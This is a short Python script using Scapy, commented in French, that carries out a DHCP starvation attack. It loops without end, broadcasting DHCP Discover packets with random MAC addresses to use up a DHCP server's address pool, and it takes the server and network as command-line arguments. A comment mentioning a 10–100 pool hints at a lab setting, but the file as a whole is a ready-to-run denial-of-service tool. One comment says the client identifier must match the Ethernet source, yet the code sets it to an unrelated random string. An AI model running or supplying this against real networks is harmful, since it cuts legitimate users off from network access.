import sys
from scapy.all import *

def dhcp_starvation(server_ip, target_network):
    print(f"--- Lancement de l'attaque sur {server_ip} (Réseau: {target_network}) ---")
    
    # On désactive le check des réponses par Scapy pour éviter qu'il n'attende
    # indéfiniment des réponses qu'il ne saura pas forcément lier.
    conf.checkIPaddr = False

    try:
        # On boucle pour envoyer des requêtes. 
        # Pour ton pool (10 à 100), il faut environ 90 requêtes.
        while True:
            # Génération d'une adresse MAC aléatoire
            rand_mac = RandMAC()
            
            # Craft du paquet :
            # 1. Ethernet : MAC source aléatoire, MAC destination broadcast
            # 2. IP : 0.0.0.0 vers 255.255.255.255 (standard DHCP)
            # 3. UDP : Port 68 vers 67
            # 4. BOOTP : chaddr est l'adresse MAC du client (doit matcher Ether src)
            # 5. DHCP : message-type 'discover'
            
            packet = (
                Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=RandString(12, "0123456789abcdef")) / # Identifiant client
                DHCP(options=[("message-type", "discover"), "end"])
            )

            sendp(packet, verbose=False)
            print(f"[*] DHCP Discover envoyé avec MAC: {rand_mac}", end="\r")

    except KeyboardInterrupt:
        print("\n[!] Attaque stoppée par l'utilisateur.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dhcp_starvation.py <DHCP_SERVER> <NETWORK>")
        sys.exit(1)

    dhcp_server = sys.argv[1]
    network = sys.argv[2]
    
    dhcp_starvation(dhcp_server, network)